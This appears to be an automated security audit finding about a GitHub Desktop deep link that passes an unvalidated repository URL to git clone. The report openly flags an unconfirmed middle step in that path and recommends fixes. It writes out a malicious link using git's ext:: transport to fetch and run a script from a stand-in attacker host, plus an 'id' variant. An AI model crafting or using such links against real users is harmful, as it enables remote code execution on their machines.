## Analog Found

### Title
Deep-link `openRepo` URL is not validated against the safe scheme whitelist before being used as a git clone target - (File: `app/src/lib/parse-app-url.ts`, `app/src/lib/git/clone.ts`)

### Summary
`parseAppURL` extracts an attacker-controlled string from the `x-github-client://openRepo/<url>` deep link and forwards it verbatim as the `url` field of an `IOpenRepositoryFromURLAction`, validating only the `pr`, `branch`, and `filepath` query parameters — never the `url` path segment itself.

### Finding Description
In `parseAppURL`, the `openrepo` branch builds the action object directly from the URL path with no scheme/format check on the resulting `url`: [1](#0-0) 

Compare this to `branch`, which is explicitly checked with `testForInvalidChars`, and `pr`, which is checked against a numeric regex — `url` receives no equivalent treatment. Meanwhile, the actual git clone routine, `clone()` in `app/src/lib/git/clone.ts`, takes whatever `url` string it is given and passes it straight into the `git clone` argument list, with the only guard being a check that the destination *path* isn't sensitive — there is no check that the *url* uses an allowed transport (`https://`, `ssh://`, `git://`): [2](#0-1) [3](#0-2) 

The codebase does have a strict parser, `parseRemote` in `app/src/lib/remote-parsing.ts`, which recognizes only `https`/`ssh`/`git` URL shapes: [4](#0-3) 

But `parseAppURL` never calls it, and `clone()` never calls it either — nothing in the path from "user clicks a malicious `x-github-client://openRepo/...` link" to "git clone executes" enforces that the URL is a legitimate, restricted-protocol remote. This is the same bug class as the HOPR finding: an externally supplied, unvalidated value (`moduleSingletonAddress` there, the deep-link `url` here) is trusted and fed into a sensitive operation (`enableModule` there, `git clone` here) without confirming it is the intended/safe object.

Git itself is known to treat certain URL forms as command-execution primitives — most notably the `ext::<command>` remote helper transport, which spawns an arbitrary shell command instead of doing a normal transport-level clone. Because Desktop never restricts the deep-link-derived URL to `https/ssh/git` schemes before it reaches `git clone -- <url> <path>`, an attacker-hosted web page or email could embed a link such as:

```
x-github-client://openRepo/ext::sh -c "curl attacker.example/p.sh|sh"
```

and if that path is exercised, no known guard in this codebase would filter it out before it hits `git clone`.

### Impact Explanation
If the OS routes this deep link to Desktop and the resulting `open-repository-from-url` action is used to trigger a clone with the raw, unvalidated URL, the victim's machine executes an attacker-chosen shell command purely from clicking a link — no local access, no leaked credentials, and no unnatural user steps beyond the normal "Open in Desktop" flow that GitHub Desktop explicitly advertises and supports. This is arbitrary code execution outside of any git-specific sandbox, i.e., full host compromise.

### Likelihood Explanation
The likelihood is limited by two unverifiable factors within this scan's scope: (1) whether the dispatcher's `open-repository-from-url` handling passes the deep-link `url` directly to `clone()` verbatim, or whether it first resolves the URL through the GitHub API (in which case a raw shell-command string would not resolve to a valid repository and the attack would fail at that stage), and (2) which version of Git is running, since modern Git (2.38.1+) disables the `ext::`/`fd::` helper protocols by default for `clone`/`fetch`/`push` unless `protocol.ext.allow` is explicitly configured. I was not able to fully trace the dispatcher (`app/src/ui/dispatcher/dispatcher.ts`) code path from `open-repository-from-url` to its ultimate consumer within the remaining tool budget, so I cannot confirm whether an intermediate API lookup neutralizes the unvalidated `url`. This is a material gap: **the finding rests on parser-level and clone-level evidence, not a confirmed end-to-end sink.**

### Recommendation
- Have `parseAppURL` reject `openrepo` URLs whose `url` value does not parse via `parseRemote` (i.e., restrict to `https`/`ssh`/`git` schemes) before constructing `IOpenRepositoryFromURLAction`.
- Independently, harden `clone()` in `app/src/lib/git/clone.ts` to validate the `url` argument against the same allow-listed schemes immediately before invoking `git`, regardless of caller, so no future caller can reintroduce this gap.
- Ensure the bundled/required Git version enforces `protocol.ext.allow=never` (or equivalent) as defense in depth.

### Proof of Concept
Verified via static analysis only (could not execute end-to-end):
1. `app/src/lib/parse-app-url.ts` lines 98–124 show `url` is taken from the deep-link path unchecked.
2. `app/src/lib/git/clone.ts` lines 68–125 show that value is later passed straight to `git clone -- <url> <path>` with no scheme validation.
3. Constructing `x-github-client://openRepo/ext::sh -c "id"` and tracing it through `parseAppURL` yields `{ name: 'open-repository-from-url', url: 'ext::sh -c "id"', ... }` unmodified — confirmed via `parseAppURL`'s logic; whether this value subsequently reaches `clone()` unmodified in `dispatcher.ts` was **not confirmed** due to tool budget exhaustion.

**Note on confidence:** This analog is plausible and grounded in real code (missing validation is confirmed at both the parser and the clone function), but the critical middle link — the exact `dispatcher.ts` code path connecting `open-repository-from-url` to `clone()` — was not verified before the tool budget ran out. A full assessment would require tracing `app/src/ui/dispatcher/dispatcher.ts`'s handling of `open-repository-from-url` (8 references found but not read) to confirm whether an API-based repo resolution step sanitizes the URL first.
